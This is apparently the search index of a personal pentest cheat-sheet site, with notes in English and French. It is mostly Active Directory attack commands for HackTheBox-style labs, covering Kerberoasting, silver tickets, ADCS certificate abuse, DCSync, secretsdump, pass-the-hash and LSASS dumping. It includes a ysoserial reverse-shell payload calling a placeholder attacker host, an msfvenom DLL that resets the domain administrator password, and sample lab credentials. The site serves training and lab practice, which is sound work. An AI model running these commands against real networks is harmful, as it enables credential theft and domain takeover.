{"config":{"lang":["fr"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Basic Enumeration","text":""},{"location":"#enum4linux-to-scan-basic-info","title":"Enum4linux to scan basic info","text":"<p>\ud83d\udd75 <pre><code>enum4linux IP \n</code></pre></p>"},{"location":"#smb-enumeration","title":"#SMB enumeration","text":"<p>List shares <pre><code>smbclient -L //IP\n</code></pre></p> <p>Enter share <pre><code>smbclient //IP/Share -U user\n</code></pre></p> <p>Impacket</p> <pre><code>impacket-smbclient -k scrm.local/ksimpson:ksimpson@DC1.scrm.local\n</code></pre> <p>[!abstract]  -k<code>: Use Kerberos authentication - scrm.local/ksimpson:ksimpson</code>: Domain and credentials</p> <ul> <li>@DC1.scrm.local`: Target FQDN </li> </ul>"},{"location":"#ldap-enumeration","title":"#LDAP enumeration","text":""},{"location":"#ldapsearch-to-find-all-kerberoastable-accounts","title":"LDAPSearch to find all Kerberoastable accounts","text":"<p>\ud83d\udd75 <pre><code>ldapsearch -x -H ldap://10.129.95.210 -D '' -w '' -b \"DC=domain,DC=local\" | grep -iE '^sAMAccountName:'\n</code></pre></p> <p>\ud83d\udd11 <pre><code>ldapsearch -x -H ldap://10.129.64.167 -D 'svc_account@domain.local' -w 'password' -b 'DC=domain,DC=htb' -s sub \"(&amp;(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))\" samaccountname | grep sAMAccountName\n</code></pre></p> <pre><code>ldapsearch -x -H ldap://10.129.206.155 -D \"ant.edwards@PUPPY.HTB\" -w 'Antman2025!' -b \"DC=puppy,DC=htb\" \"(sAMAccountName=ADAM.SILVER)\" distinguishedName userAccountControl\n</code></pre> <p>or :</p> <pre><code>ldapsearch -x -H ldap://10.129.41.200 \\\n  -D 'p.agila@fluffy.htb' \\\n  -w 'prometheusx-303' \\\n  -b \"DC=fluffy,DC=htb\" \\\n  | grep -iE '^sAMAccountName:'\n</code></pre> <p>[!warning]  if required TLS/SSL : </p> <p>Users <pre><code>LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://10.129.214.147 -D 'ksimpson@scrm.local' -w 'ksimpson' -b \"DC=scrm,DC=local\" | grep -i '^sAMAccountName:'\n</code></pre></p> <p>Domain SID <pre><code>LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://dc1.scrm.local \\\n    -D \"ksimpson@scrm.local\" \\\n    -w 'ksimpson' \\\n    -b \"DC=scrm,DC=local\" \\\n    \"(objectClass=domain)\" objectSid\n</code></pre></p> <p>[!success]  Best practice is to use kinit with /etc/krb5.conf </p> <pre><code>[libdefaults]\ndefault_realm = SCRM.LOCAL\n[realms]\nSCRM.LOCAL = {\nkdc = dc1.scrm.local\n}\n[domain_realm]\n.scrm.local = SCRM.LOCAL\n</code></pre> <p>vim cmd SCRM.LOCAL to NEW.LOCAL : <pre><code>:%s/SCRM.LOCAL/NEW.LOCAL/\n</code></pre></p> <p>[!attention]  If you need to use another ticket later (TGS) you need to perform a kdestroy </p> <pre><code>kdestroy\nkinit MiscSvc@SCRM.LOCAL\n</code></pre>"},{"location":"#ldif-file","title":"LDIF file","text":"<p>[!info]  dn: CN=Infrastructure,CN=Users,DC=tombwatcher,DC=htb changetype: modify add: member member: CN=Alfred,CN=Users,DC=tombwatcher,DC=htb</p> <p>Then execute :</p> <pre><code>ldapmodify -x -H ldap://10.129.206.155 -D \"ant.edwards@PUPPY.HTB\" -w 'Antman2025!' -f ../../../../Puppy/enable.ldif\n</code></pre> <p>[!done]  </p>"},{"location":"#windapsearch-enumerate-all-accounts","title":"WindapSearch enumerate all accounts","text":"<p>\ud83d\udd75 <pre><code>./windapsearch.py -d htb.local --dc-ip 10.129.95.210 -U\n</code></pre></p> <pre><code>./windapsearch.py -d htb.local --dc-ip 10.129.95.210 --custom \"objectClass=*\"\n</code></pre> <pre><code>./windapsearch.py -d htb.local --dc-ip 10.129.95.210 -s \"Exchange Windows Permissions\" -U --full\n</code></pre> <p>#Bloodhound-python Obtains exploitable files for bloodhounding</p> <p>\ud83d\udd11 <pre><code>sudo bloodhound-python -u 'user' -p 'password' -ns IP -d domain -c all\n</code></pre></p>"},{"location":"#bloodhound-docker","title":"Bloodhound &amp; Docker","text":"<p>Launch the yaml file a first time and then when you restart the docker in the future, replace :</p> <p>[!missing]  bhe_recreate_default_admin=${bhe_recreate_default_admin:-false}</p> <p>by </p> <p>[!check]  bhe_recreate_default_admin=${bhe_recreate_default_admin:-true} </p>"},{"location":"#bruteforce","title":"#Bruteforce","text":""},{"location":"#kerbrute","title":"kerbrute","text":""},{"location":"#kerbrute-bruteuser-d-scrmlocal-usrsharewordlistsrockyoutxt-ksimpson-dc-10129214147","title":"<pre><code>./kerbrute bruteuser -d scrm.local /usr/share/wordlists/rockyou.txt ksimpson --dc 10.129.214.147\n</code></pre>","text":""},{"location":"#as-rep-roasting-to-obtain-tgt-response-hashes","title":"#AS-REP-Roasting to obtain TGT response &amp; hashes","text":""},{"location":"#getnpusers-extract-tgts-kerberos-ticket-granting-tickets","title":"GetNPUsers extract TGTs (Kerberos Ticket Granting Tickets)","text":"<p>for users who do not require pre-authentication (allowing password cracking afterward) #AS-REP-Roasting </p> <p>\ud83d\udd13 <pre><code>impacket-GetNPUsers 'HTB.LOCAL/' -dc-ip 10.129.95.210 -usersfile users.txt -format hashcat\n</code></pre></p>"},{"location":"#getuserspns","title":"GetUserSPNs","text":"<p>Enumerate SPN users (Kerberoastable) - add -request argument to get hash</p>"},{"location":"#impacket-addcomputer","title":"impacket-addcomputer","text":"<p>allow to add a computer user with high privileges</p>"},{"location":"#impacket-rbcd","title":"impacket-rbcd","text":"<p>configure the target object so that the attacker-controlled computer can delegate to it (Resource-Based Constrained Delegation)</p>"},{"location":"#spn-checking","title":"#SPN checking","text":"<pre><code>impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -dc-ip 10.129.214.147 -dc-host dc1.scrm.local -k -request\n</code></pre>"},{"location":"#silverticketattack","title":"#SilverTicketAttack","text":"<p>[!info]  - It's a forged Service Ticket (TGS), signed with the service account\u2019s NTLM hash. - Allows you to access a specific service (like MSSQL) impersonating the user. - Requires the service account\u2019s password hash (which you have). - Does NOT require the krbtgt account hash (unlike Golden Ticket). - Useful when you have a service account but want to escalate inside the domain. </p>"},{"location":"#impacket-ticketer","title":"impacket-ticketer","text":"<p>We need Domain SID, NTLM hash of sqlsvc and the</p> <pre><code>impacket-ticketer -spn \"MSSQLSvc/dc1.scrm.local\" -user \"ksimpson\" -password \"ksimpson\" -nthash \"B999A16500B87D17EC7F2E2A68778F05\" -domain scrm.local -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -dc-ip dc1.scrm.local Administrator\n</code></pre>"},{"location":"#impacket-crackmapexec","title":"#impacket-crackmapexec","text":"<p>options : #smb #ldap #ftp #winrm</p> Purpose Command (example) Description \u2705 Validate Credentials <code>cme smb 10.0.0.0/24 -u user -p pass</code> Test login on SMB across subnet \ud83d\udd0d Enumerate SMB shares <code>cme smb 10.0.0.5 -u user -p pass --shares</code> List SMB shares \ud83e\uddd1\u200d\ud83e\udd1d\u200d\ud83e\uddd1 Enumerate Domain Users <code>cme smb 10.0.0.5 -u user -p pass --users</code> Get domain users \ud83d\udcc1 Get GPP passwords <code>cme smb 10.0.0.5 -u user -p pass --gpp-passwords</code> Look for Group Policy Preference stored creds \ud83e\udde0 Dump LSASS <code>cme smb 10.0.0.5 -u user -p pass -M lsassy</code> Dump credentials from LSASS using <code>lsassy</code> \ud83e\ude9f Execute commands <code>cme smb 10.0.0.5 -u user -p pass -x \"ipconfig\"</code> Run shell command on remote host \ud83e\uddfe Password spraying <code>cme smb 10.0.0.0/24 -u users.txt -p \"Winter2024\"</code> Test one password across many users \ud83d\udd10 Pass-the-Hash <code>cme smb 10.0.0.5 -u user -H aad3b435b51404eeaad3b435b51404ee:hash</code> Authenticate with NTLM hash \ud83c\udf9b\ufe0f WinRM access <code>cme winrm 10.0.0.5 -u user -p pass</code> Remote command execution via WinRM \ud83e\uddec LDAP enumeration <code>cme ldap 10.0.0.5 -u user -p pass</code> Pull LDAP data (e.g., user list, groups, etc.) \ud83d\udc1a Get reverse shell <code>cme smb 10.0.0.5 -u user -p pass -x \"powershell -nop -c IEX(...)\"</code> Trigger reverse shell payload &gt; [!tip] &gt; ###### #NetExec  is the new #CrackMapExec <ol> <li>Basic LDAP Enumeration</li> </ol> <pre><code>netexec ldap 10.129.70.145 -u emily -p 'Password123!' -d administrator.htb --users\n</code></pre> <ol> <li>List Groups</li> </ol> <pre><code>netexec ldap 10.129.70.145 -u emily -p 'Password123!' -d administrator.htb --groups\n</code></pre> <ol> <li>Kerberoast (Find SPNs and Request Tickets)</li> </ol> <pre><code>netexec ldap 10.129.70.145 -u emily -p 'Password123!' --kerberoast\n</code></pre> <ol> <li>Password Spraying</li> </ol> <pre><code>netexec smb 10.129.70.0/24 -u users.txt -p 'Summer2024!'\n</code></pre> <ol> <li>Execute a Command on a Host (Lateral Movement)</li> </ol> <pre><code>netexec smb 10.129.70.150 -u emily -p 'Password123!' -x 'whoami'\n</code></pre> <ol> <li>Dump SMB Shares</li> </ol> <pre><code>netexec smb 10.129.70.145 -u emily -p 'Password123!' --shares\n</code></pre> <ol> <li>Check for Local Admin Access</li> </ol> <pre><code>netexec smb 10.129.70.150 -u emily -p 'Password123!' --local-admin-check\n</code></pre> <ol> <li>WinRM Command Execution</li> </ol> <pre><code>netexec winrm 10.129.70.150 -u emily -p 'Password123!' -x 'ipconfig /all'\n</code></pre> <pre><code>netexec smb 192.168.138.137 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=192.168.138.149\n</code></pre>"},{"location":"#details","title":"Details","text":"<ul> <li><code>netexec smb 192.168.138.137</code>     Targets the SMB service on the host at 192.168.138.137.</li> <li><code>-d marvel.local</code>     Specifies the domain name as marvel.local.</li> <li><code>-u fcastle</code>     Uses the username fcastle.</li> <li><code>-p Password1</code>     Authenticates with password Password1.</li> <li><code>-M slinky</code>     Loads and runs the <code>slinky</code> module. (Assuming <code>slinky</code> is a specific NetExec module or custom module for lateral movement or execution.)</li> <li><code>-o NAME=test SERVER=192.168.138.149</code>     Passes options (<code>-o</code>) to the module with parameters:<ul> <li><code>NAME=test</code></li> <li>`SERVER=192.168.138.149</li> </ul> </li> </ul>"},{"location":"#kerbrute_1","title":"#kerbrute","text":"<pre><code>./kerbrute passwordspray -d megabank.local --dc 10.129.96.155 /home/kali/Resolute/users.txt Welcome123!\n</code></pre> <p>or</p> <pre><code>./kerbrute passwordspray -d megabank.local --dc 10.129.96.155 users.txt pass.txt\n</code></pre>"},{"location":"#exploitation","title":"Exploitation","text":"<p>[!info]  Linux </p> <p>(Permission Abuse) Add member <pre><code>net rpc group addmem \"DEVELOPERS\" \"levi.james\" -U \"PUPPY.HTB\"/\"levi.james\"%'KingofAkron2025!' -S \"PUPPY.HTB\"\n</code></pre></p> <p>(Permission Abuse) Change password <pre><code>net rpc password \"adam.silver\" -U \"PUPPY.HTB\"/\"levi.james\"%'KingofAkron2025!' -S \"DC.PUPPY.HTB\"\n</code></pre></p>"},{"location":"#powershell","title":"PowerShell","text":""},{"location":"#windows-powershell","title":"Windows #Powershell","text":"Purpose Command Who am I <code>whoami</code> or <code>$env:USERNAME</code> Get user SID <code>whoami /user</code> List local users <code>Get-LocalUser</code> (\u2265 Win10) or <code>net user</code> Group membership <code>whoami /groups</code> Logged-in users <code>query user</code> or <code>Get-WmiObject -Class Win32_ComputerSystem</code> Environment vars <code>Get-ChildItem Env:</code> Purpose Command IP config <code>ipconfig /all</code> Network interfaces <code>Get-NetIPConfiguration</code> Routing table <code>route print</code> Open connections <code>netstat -ano</code> DNS cache <code>ipconfig /displaydns</code> Firewall status <code>Get-NetFirewallProfile</code> ARP table <code>arp -a</code> Purpose Command Domain name <code>[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</code> Hostname <code>hostname</code> AD domain controller <code>nltest /dclist:&lt;domain&gt;</code> Trust relationships <code>nltest /domain_trusts</code> AD user list (if allowed) <code>net user /domain</code> AD group list (if allowed) <code>net group /domain</code> Purpose Command List drives <code>Get-PSDrive -PSProvider FileSystem</code> List folders/files <code>Get-ChildItem -Recurse -Force</code> Hidden files <code>dir -Force</code> File contents <code>Get-Content .\\file.txt</code> Recent files `dir $env:USERPROFILE -Recurse Purpose Command Search files for passwords <code>Select-String -Path *.txt -Pattern \"password\"</code> Browser credentials Access limited, but can look for user-level files Wi-Fi creds <code>netsh wlan show profiles</code> (then <code>netsh wlan show profile name=\"SSID\" key=clear</code>) Purpose Command System info <code>systeminfo</code> OS version <code>[System.Environment]::OSVersion</code> Architecture <code>$env:PROCESSOR_ARCHITECTURE</code> Uptime <code>(Get-CimInstance Win32_OperatingSystem).LastBootUpTime</code> AV product <code>Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct</code> Local admins <code>net localgroup administrators</code> (May fail on low priv) <p>[!note]  Even as a low-privileged user, you can prep for privilege escalation: - Search for misconfigured services - Look for write access to folders in PATH - Check if you're in any unexpected privileged groups - Check alwaysInstallElevated policy: - <code>reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer</code> - <code>reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer</code> </p>"},{"location":"#ad-powershell","title":"AD #Powershell","text":"Targets / Purpose Example Usage Fetch AD user accounts <code>Get-ADUser -Filter *</code> List AD groups <code>Get-ADGroup -Filter *</code> List computers in AD <code>Get-ADComputer -Filter *</code> List OUs <code>Get-ADOrganizationalUnit -Filter *</code> List members of a group <code>Get-ADGroupMember \"Domain Admins\"</code> Groups for a user/computer <code>Get-ADPrincipalGroupMembership jdoe</code> Generic search for any AD object <code>Get-ADObject -LDAPFilter \"(objectClass=*)\"</code> Info about current domain <code>Get-ADDomain</code> List domain controllers <code>Get-ADDomainController -Filter *</code> Info about forest structure <code>Get-ADForest</code> Password policies <code>Get-ADFineGrainedPasswordPolicy -Filter *</code> AD replication topology <code>Get-ADReplicationSite -Filter *</code> Managed service accounts <code>Get-ADServiceAccount -Filter *</code> Domain trust relationships <code>Get-ADTrust</code> User\u2019s effective password policy <code>Get-ADUserResultantPasswordPolicy jdoe</code> Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName | Select SamAccountName,ServicePrincipalName Example : <pre><code>whoami /groups\n</code></pre> <pre><code>Get-Content \"$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\"\n</code></pre>"},{"location":"#abuse-linux-latmov","title":"Abuse (Linux Latmov)","text":""},{"location":"#addself-abuse","title":"AddSelf abuse","text":"<ol> <li>Add yourself</li> </ol> <pre><code>net rpc group addmem \"INFRASTRUCTURE\" \"alfred\" -U \"TOMBWATCHER\"/\"alfred\"%'basketball' -S \"TOMBWATCHER.HTB\"\n</code></pre> <ol> <li>Verify that you are in :</li> </ol> <pre><code>net rpc group members \"TargetGroup\" -U \"DOMAIN\"/\"ControlledUser\"%\"Password\" -S \"DomainController\"\n</code></pre>"},{"location":"#genericall-or-genericwrite-abuse","title":"GenericAll  or #GenericWrite abuse","text":"<p>If #ADCS Activate Directory Certificate Services vulnerability :</p> <pre><code>certutil -template\n</code></pre> <p>or show one specific template name information :</p> <pre><code>certutil -template | Select-String -Pattern \"We\nbServer\" -Context 0,14\n</code></pre> <p>\ud83d\udd11 #certipy </p> <pre><code>certipy-ad find -u 'svc_ldap@authority.htb' -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.229.56\n</code></pre> <pre><code>certipy req -u 'ryan.cooper@sequel.htb' -p 'NuclearMosquito3' -ca 'sequel-dc-ca' -template 'UserAuthentication' -target sequel.htb -upn administrator@sequel.htb\n</code></pre> <p>If #ESC1 vulnerability : </p> <p>[!question]  Conditions : - Machineaccount quota is more than 2 - One certificate allows all domain computers to enrol </p> <pre><code>impacket-addcomputer 'authority.htb/svc_ldap' -method LDAPS -computer-name 'INSIDER01$' -computer-pass 'Summer2018!' -dc-ip 10.129.229.56\n</code></pre> <p>Next, we use this computer account to request a certificate specifying the built-in domain Administrator account as the SAN</p> <pre><code>certipy-ad auth -pfx administrator_authority.pfx -debug\n</code></pre> <p>[!fail]  Sometimes it can fail due to the fact the DC doesn't not support PKINIT </p>"},{"location":"#so-is-pass-the-cert-possible","title":"\ud83d\udd0d So, is Pass-the-Cert possible?","text":"<p>To determine that, answer these:</p> <ol> <li>\u2705 Do you have a valid client authentication certificate (with <code>UPN</code> in SAN)?</li> <li>\u2705 Is PKINIT enabled on the DC? (Windows Server 2016+ typically has it.)</li> <li>\u2705 Can the DC resolve the <code>UPN</code> you're sending (like <code>administrator@authority.htb</code>)?</li> <li>\u2705 Is time synced and port 88 open between you and the DC?</li> </ol> <p>If all yes: Pass-the-Cert should work.</p>"},{"location":"#export-keys-with-openssl","title":"Export keys with #Openssl","text":"<pre><code>openssl pkcs12 -in administrator_authority.pfx -nocerts -out administrator.key\n</code></pre> <pre><code>openssl pkcs12 -in administrator_authority.pfx -clcerts -nokeys -out administrator.crt\n</code></pre> <p>or</p> <pre><code>openssl pkcs12 -in administrator_authority.pfx -nokeys -out administrator.crt\n</code></pre>"},{"location":"#pass-the-cert","title":"Pass-the-cert","text":"<p>[!note]  Use PassTheCert Github repo script </p> <pre><code>python3 ../tools/PassTheCert/Python/passthecert.py -dc-ip 10.129.229.56 -crt administrator.crt -key administrator.key -domain authority.htb -port 636 -action write_rbcd -delegate-to 'AUTHORITY$' -delegate-from 'INSIDER01$'\n</code></pre>"},{"location":"#impacket-getst","title":"impacket-getST","text":"<p>[!note]  Impersonate the Administrator account and grab a TGT </p> <p>[!important]  Requires : sudo ntpdate 10.129.229.56 </p> <pre><code>impacket-getST -spn 'cifs/AUTHORITY.authority.htb' -impersonate Administrator\n'authority.htb/INSIDER01$:SuperPassword!'\n</code></pre> <p>[!hint]  Declare KRB5CCNAME variable following the creating of the ccache file </p> <pre><code>export KRB5CCNAME=Name-of-the-file.ccache\n</code></pre>"},{"location":"#impacket-gettgt","title":"impacket-getTGT","text":"<p>[!note]  Get TGT ticket from a svc service running </p> <pre><code>impacket-getTGT scrm.loca/Miscsvc:ScrambledEggs9900\n</code></pre> <p>or :</p> <pre><code>impacket-getTGT -aesKey 499620251908efbd6972fd63ba7e385eb4ea2f0ea5127f0ab4ae3fd7811e600a tombwatcher.htb/ansible_dev$ -dc-ip 10.129.203.235\n</code></pre> <p>[!tip]  Export KRB5CCNAME variable </p> <pre><code>evil-winrm -i dc1.scrm.local -r SCRM.LOCAL\n</code></pre>"},{"location":"#secretdumps","title":"SecretDumps","text":"<p>see below</p>"},{"location":"#powerview-win-latmov","title":"PowerView (Win LatMov)","text":""},{"location":"#powerview-ps-to-enumerate-ad-system","title":"PowerView-ps to enumerate AD system","text":"<p>PowerView.ps1</p> <pre><code>powershell -ep bypass\n</code></pre> <pre><code>Import-Module . .\\PowerView.ps1\n</code></pre> <pre><code>Get-DomainGroupMember \"GroupName\"\n</code></pre> <p>If Permissions #GenericAll  or #GenericWrite :</p> <pre><code>$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n</code></pre> <pre><code>Set-DomainUserPassword -Identity 'account@domain.htb' -AccountPassword $NewPassword\n</code></pre>"},{"location":"#get-adobject","title":"Get-ADObject","text":"<p>[!note]  - To retrieve non-user or non-group AD objects like organizational units (OUs), service connection points, computer accounts, etc. - To fetch specific attributes that other cmdlets like <code>Get-ADUser</code> or <code>Get-ADGroup</code> don\u2019t return by default. - To enumerate unusual or hidden properties, such as: - <code>msDS-AllowedToDelegateTo</code> (used in delegation attacks) - <code>msDS-ManagedPassword</code> (from gMSA accounts) - <code>ms-DS-MachineAccountQuota</code> - <code>adminCount</code> (flag for protected groups) </p> <pre><code>Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota\n</code></pre>"},{"location":"#get-aduser-obtain-info-about-users","title":"Get-ADUser Obtain info about users","text":"<pre><code>Get-ADUser -Identity svc_loanmgr -Properties * | Format-List\n</code></pre>"},{"location":"#get-addomain-obtain-info-about-domain","title":"Get-ADDomain Obtain info about domain","text":"<pre><code>Get-ADDomain\n</code></pre>"},{"location":"#privesc","title":"PrivEsc","text":"<p>[!tip]  Granting a user\u00a0DCSync rights in Active Directory\u00a0is\u00a0very similar\u00a0to giving a user on a Linux system the ability to\u00a0read\u00a0<code>/etc/shadow</code></p>"},{"location":"#impacket-getst-request-service-ticket-tgt-to-impersonate-admin-kerberos-ccache-file","title":"impacket-getST Request Service ticket (TGT) to impersonate admin (Kerberos .ccache file)","text":""},{"location":"#pywhisker-to-add-kerberos-shadow-credentials","title":"pyWhisker to Add Kerberos Shadow Credentials","text":"<pre><code>pywhisker add -u attacker@domain.com -p 'Password123!' -t victimuser -k shadow.key\n</code></pre>"},{"location":"#rubeus-authenticate-using-the-key-and-the-cert-file","title":"Rubeus authenticate using the key and the cert file","text":"<pre><code>Rubeus asktgt /user:victimuser /certificate:shadow.crt\n</code></pre>"},{"location":"#binaryformatter-serialization","title":"#BinaryFormatter &amp; #Serialization","text":"<p>![[Pasted image 20250625183138.png]] 1. From windows machine, download ysoserial.exe 2. Execute this : <pre><code>ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c\n\"C:\\users\\miscsvc\\music\\nc64.exe -e powershell KALI_IP 9001\"\n</code></pre> 4. Copy base64 lines 5. Execute it using the order + base64 code with : <pre><code>nc ip 4411\n</code></pre></p>"},{"location":"#targetedkerberoast","title":"#targetedKerberoast","text":"<p>Performs an LDAP search to find user accounts with a Service Principal Name (SPN), request a TGS and then dump all the SPN accounts hash</p>"},{"location":"#dcsync-attack-rendre-un-compte-kerberoastable","title":"DCsync attack (Rendre un compte Kerberoastable)","text":"<pre><code>./targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'Password123!' --dc-ip 10.129.70.145\n</code></pre>"},{"location":"#bloodyad","title":"BloodyAD","text":""},{"location":"#impacket-dacledit-with-creds-domain-ou-and-writedacl-perm-over-a-dc-you-can-dcsync-and-dump-hashes","title":"#impacket-dacledit with creds, domain, OU, and WriteDACL perm over a DC, you can DCSync and dump hashes","text":"<pre><code>impacket-dacledit -action write \\\n  -rights DCSync \\\n  -target-dn 'CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local' \\\n  -principal svc-alfresco \\\n  htb.local/svc-alfresco:s3rvice\n</code></pre>"},{"location":"#secretdumps-allow-a-high-privileged-user-to-dump-admin-hashes","title":"#SecretDumps allow a high-privileged user to dump admin hashes","text":"<pre><code>impacket-secretsdump dom.htb/svc:'Moneymakestheworldgoround!'@10.129.225.17\n</code></pre> <pre><code>impacket-secretsdump -k -no-pass authority.htb/Administrator@authority.authority.htb -just-dc-ntlm\n</code></pre> <pre><code>impacket-secretsdump -outputfile all_hashes -just-dc ADMINISTRATOR.HTB/ethan@10.129.70.145\n</code></pre> Target Command Example Description \ud83d\udda5\ufe0f Dump local SAM hashes <code>secretsdump.py LOCAL -target-ip 10.0.0.5</code> Run locally on compromised host \ud83d\udce1 Dump remotely with creds <code>secretsdump.py DOMAIN/user:password@10.0.0.5</code> Dump SAM/LSASS over SMB \ud83d\udd11 Use NTLM hash <code>secretsdump.py DOMAIN/user@10.0.0.5 -hashes &lt;LM&gt;:&lt;NT&gt;</code> Pass-the-hash to authenticate \ud83e\uddec Dump NTDS from DC <code>secretsdump.py -just-dc DOMAIN/user:pass@dc.ip</code> Extract domain hashes from NTDS remotely \ud83e\uddec Just secrets from DC <code>secretsdump.py -just-dc-user 'svc-*' DOMAIN/user:pass@dc.ip</code> Filtered extraction (e.g. only service accounts) \ud83d\udcbd Offline NTDS dump <code>secretsdump.py -ntds ntds.dit -system SYSTEM</code> Extract hashes from NTDS/SYSTEM registry files \ud83e\uddfe Use Kerberos (TGT) <code>secretsdump.py -k -no-pass user@10.0.0.5</code> Use current Kerberos ticket (if available) \ud83e\udeaa SAM from registry <code>secretsdump.py -sam SAM -system SYSTEM</code> Extract from local registry hives (offline) ###### #DPAPI <p>https://www.synacktiv.com/ressources/univershell_2017_dpapi.pdf</p>"},{"location":"#runas","title":"#runas","text":"<p>https://www.hackingarticles.in/windows-privilege-escalation-stored-credentials-runas/</p> <p>(troubleshooting with NTP) https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069</p> <p>[!attention]  Probleme avec horloge </p> <p>![[Pasted image 20250526195446.png]] Steal the encrypted blob -&gt;</p> <p>[!attention]  Fulfill here </p> <p>https://www.hackingarticles.in/readgmsapassword-attack/ ??</p>"},{"location":"#psexec-log-in-to-machine-using-hash-pass-the-hash-pass-the-ticket","title":"#psexec Log in to machine using has\ufe0fh #Pass-the-hash , #Pass-the-ticket","text":"<pre><code>impacket-psexec administrator@10.129.95.210 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6\n</code></pre>"},{"location":"#wmiexec-obtain-a-shell-with-admin-credentials-plaintext","title":"#Wmiexec Obtain a shell with admin credentials (plaintext)","text":"<pre><code>impacket-wmiexec tombwatcher.htb/Alfred:'basketball'@10.129.203.235\n</code></pre>"},{"location":"#msfvenom","title":"#msfvenom","text":"<pre><code>msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll &gt; da.dll\n</code></pre>"},{"location":"#azure","title":"#Azure","text":"<pre><code>Get-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ADSync\n</code></pre> <p>Check Get-Process or tasklist</p>"},{"location":"#lsass-dump","title":"#LSASS dump","text":""},{"location":"#pypykatz-requires-to-dump-dmp-file","title":"pypykatz (requires to dump .dmp file)","text":"<pre><code>pypykatz lsa minidump lsass.dmp\n</code></pre>"},{"location":"#mssql","title":"MSSQL","text":""},{"location":"#list-all-schemas-in-the-current-database","title":"\ud83e\uddf1 List all schemas in the current database","text":"<pre><code>SELECT name FROM sys.schemas;\n</code></pre>"},{"location":"#list-all-tables-in-the-current-database","title":"\ud83d\udccb List all tables in the current database","text":"<pre><code>SELECT schema_name(schema_id) AS schema_name, name  FROM sys.tables;\n</code></pre>"},{"location":"#list-all-columns-for-a-specific-table","title":"\ud83d\udccc List all columns for a specific table","text":"<pre><code>SELECT COLUMN_NAME, DATA_TYPE  FROM INFORMATION_SCHEMA.COLUMNS  WHERE TABLE_NAME = 'Employees';\n</code></pre>"},{"location":"#search-for-interesting-table-names","title":"\ud83d\udd0d Search for interesting table names","text":"<pre><code>SELECT name  FROM sys.tables  WHERE name LIKE '%user%' OR name LIKE '%login%' OR name LIKE '%cred%' OR name LIKE '%pass%';\n</code></pre>"},{"location":"#privilegerole-enumeration","title":"\ud83e\uddd1\u200d\ud83d\udd10 Privilege/role enumeration","text":""},{"location":"#check-your-current-login","title":"Check your current login","text":"<pre><code>SELECT SYSTEM_USER;  -- SQL login SELECT SUSER_NAME(); -- Domain or login name\n</code></pre>"},{"location":"#list-your-roles","title":"List your roles","text":"<pre><code>EXEC sp_helpuser;\n</code></pre>"},{"location":"#see-what-permissions-you-have","title":"See what permissions you have","text":"<pre><code>SELECT * FROM fn_my_permissions(NULL, 'DATABASE');\n</code></pre>"},{"location":"#system-level-info","title":"\ud83c\udfdb System-level info","text":""},{"location":"#show-mssql-version","title":"Show MSSQL version","text":"<p><code>SELECT @@VERSION;</code></p>"},{"location":"#show-instance-name","title":"Show instance name","text":"<p><code>SELECT @@SERVICENAME;</code></p>"},{"location":"#get-current-database-name","title":"Get current database name","text":"<p><code>SELECT DB_NAME();</code></p>"},{"location":"#extracting-data","title":"\ud83d\udce6 Extracting data","text":""},{"location":"#example-dump-all-users-in-a-users-table","title":"Example: dump all users in a <code>Users</code> table","text":"<p><code>SELECT * FROM Users;</code></p>"},{"location":"#example-dump-credentials-from-a-common-table-name","title":"Example: dump credentials from a common table name","text":"<p><code>SELECT * FROM Credentials;</code></p>"},{"location":"#persistence","title":"Persistence","text":"<p>Golden ticket</p> <p>krtbgt hash is cracked, then game over.</p>"},{"location":"01_networking/","title":"\ud83d\ude80 Sc\u00e9nario de Test \u2013 Exemple de Template","text":"<p>Bienvenue dans le template HackOps. Ce fichier te montre comment utiliser toutes les fonctionnalit\u00e9s utiles.  </p>"},{"location":"01_networking/#introduction","title":"\ud83d\udcdd Introduction","text":"<p>Ceci est une page de test avec diff\u00e9rents \u00e9l\u00e9ments : images, callouts, code, tags et plus.</p>"},{"location":"01_networking/#callouts-admonitions","title":"\ud83d\udccc Callouts (Admonitions)","text":"<p>Information</p> <p>Ceci est un callout info.</p> <p>Attention</p> <p>\u26a0\ufe0f Attention \u00e0 ne pas ex\u00e9cuter cette commande en production !</p> <p>Succ\u00e8s</p> <p>\u2705 Cette \u00e9tape a fonctionn\u00e9.</p> D\u00e9tails cach\u00e9s <p>Tu peux aussi utiliser les callouts repliables (<code>???</code>).</p> <p>[!tip] Ceci est un callout style Obsidian \u2192 fonctionne si tu as bien configur\u00e9 <code>pymdownx.blocks.admonition</code>.</p>"},{"location":"01_networking/#images","title":"\ud83d\uddbc\ufe0f Images","text":"<p>Image stock\u00e9e localement dans <code>docs/images/</code> :  </p> <p></p> <p>Image externe (redimensionn\u00e9e) :  </p> <p></p>"},{"location":"01_networking/#liens","title":"\ud83d\udd17 Liens","text":"<ul> <li>Lien interne : Retour \u00e0 l\u2019accueil </li> <li>Lien externe : Visiter HackTricks </li> </ul>"},{"location":"01_networking/#code-blocks","title":"\ud83d\udcbb Code 